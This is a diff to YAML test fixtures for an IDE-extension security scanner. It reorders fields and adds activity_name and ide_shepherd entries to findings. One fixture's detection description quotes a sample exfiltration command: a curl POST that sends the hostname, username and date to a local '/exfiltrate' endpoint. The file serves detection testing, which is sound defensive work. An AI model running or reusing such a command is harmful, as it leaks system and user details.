@@ -15,12 +15,15 @@ tests:
         vendor_name: "rust-lang"
         version: "0.3.2769"
       category_uid: 2
-      class_uid: 2007
       class_name: "Application Security Posture Finding"
+      class_uid: 2007
       finding_info:
         desc: "Detected 0 suspicious pattern(s) (Risk: none, Score: 0)"
         title: "Metadata Analysis: rust-lang.rust-analyzer-0.3.2769"
         uid: "rust-lang.rust-analyzer-0.3.2769-metadata-analysis"
+      ide_shepherd:
+        activity_name: "updated"
+        class_name: "Application Security Posture Finding"
       isAlert: false
       metadata:
         environment:
@@ -54,13 +57,17 @@ tests:
   result:
     custom:
       activity_id: 1
+      activity_name: "installed"
       category_uid: 2
-      class_uid: 2004
       class_name: "Detection Finding"
+      class_uid: 2004
       finding_info:
         desc: "Detected command injection attempt: curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
         title: "Security Detection: Command Injection"
         uid: "fe018e8b-d950-4a91-9714-0601b8c5c66f"
+      ide_shepherd:
+        activity_name: "installed"
+        class_name: "Detection Finding"
       isAlert: true
       metadata:
         environment:
@@ -97,3 +104,4 @@ tests:
     tags:
      - "source:ide-shepherd"
     timestamp: 1768318612012
+
